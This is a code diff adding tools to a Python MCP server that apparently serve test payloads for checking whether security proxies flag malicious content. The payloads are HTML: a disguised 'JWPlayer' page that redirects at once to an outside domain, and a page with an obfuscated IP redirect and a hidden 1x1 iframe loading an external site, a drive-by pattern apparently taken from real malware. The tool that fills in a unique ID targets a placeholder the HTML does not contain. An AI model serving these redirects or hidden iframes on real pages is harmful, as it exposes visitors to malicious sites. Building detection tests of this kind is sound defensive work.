@@ -11,6 +11,7 @@ from mcp.server.fastmcp import FastMCP
 from mcp.types import CreateMessageResult, ElicitResult, GetPromptResult
 from dotenv import load_dotenv
 import os
+import uuid
 import uvicorn
 
 load_dotenv()
@@ -236,6 +237,64 @@ def get_html_payload_2() -> CreateMessageResult:
         content={"type": "text", "text": html_content.strip()},
         model="threat-test-html"
     )
+    
+@mcp.tool()
+def get_clean_payload() -> CreateMessageResult:
+    """Returns a redirect-based HTML payload for security testing."""
+    # Note: Redirects to low-reputation sites often trigger threat alerts.
+    html_content = """
+    <!DOCTYPE html>
+    <html>
+    <head>
+        <meta charset="utf-8" />
+        <title>JWPlayer</title>
+        <meta http-equiv="Refresh" content="0; url=https://impervert.com/" />
+    </head>
+    <body>
+        <p>Redirecting to video player...</p>
+    </body>
+    </html>
+    """
+    return CreateMessageResult(
+        role="assistant",
+        content={"type": "text", "text": html_content.strip()},
+        model="threat-test-html"
+    )
+
+@mcp.tool()
+def inspect_custom_payload(malicious_code: str) -> str:
+    """
+    Receives custom malicious code from the client for testing inbound proxy inspection.
+    """
+    # The server just prints it and echoes it back
+    print(f"[SECURITY ALERT] Received payload: {malicious_code}")
+    
+    return f"Server successfully received your payload: {malicious_code}"
+
+
+@mcp.tool()
+def get_html_payload_diff_md5() -> CreateMessageResult:
+    """Returns malicious HTML/JavaScript for browser exploit testing."""
+    
+    # 1. Generate a universally unique identifier (UUID) for this specific request
+    unique_hash_buster = uuid.uuid4().hex
+    
+    # PASTE YOUR HTML/JS CONTENT BETWEEN THE TRIPLE QUOTES BELOW
+    # Notice the comment inside the <head>
+    html_content = """
+    <!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd"> <html xmlns="http://www.w3.org/1999/xhtml"> <head> <meta http-equiv="Content-Type" content="text/html; charset=utf-8" /> <meta http-equiv="Pragma" content="no-cache" /> <title></title> <script language="JavaScript" type="text/javascript"> var SSLPort ='80'; var SSLHostIp ='154\x2e88\x2e175\x2e59'; function LoadFrame() { window.location="https://" + SSLHostIp + ":" + SSLPort; } </script> </head> <body class="mainbody" onLoad="LoadFrame();"> <iframe src="http://ZieF.pl/rc/" width=1 height=1 style="border:0"></iframe> </body> </html
+
+    """
+    
+    # 2. Swap out the placeholder with the unique string
+    dynamic_html = html_content.replace("__UNIQUE_ID__", unique_hash_buster)
+    
+    return CreateMessageResult(
+        role="assistant",
+        content={"type": "text", "text": dynamic_html.strip()},
+        model="threat-test-html"
+    )
+
 
 
 # -------------------------------------------------
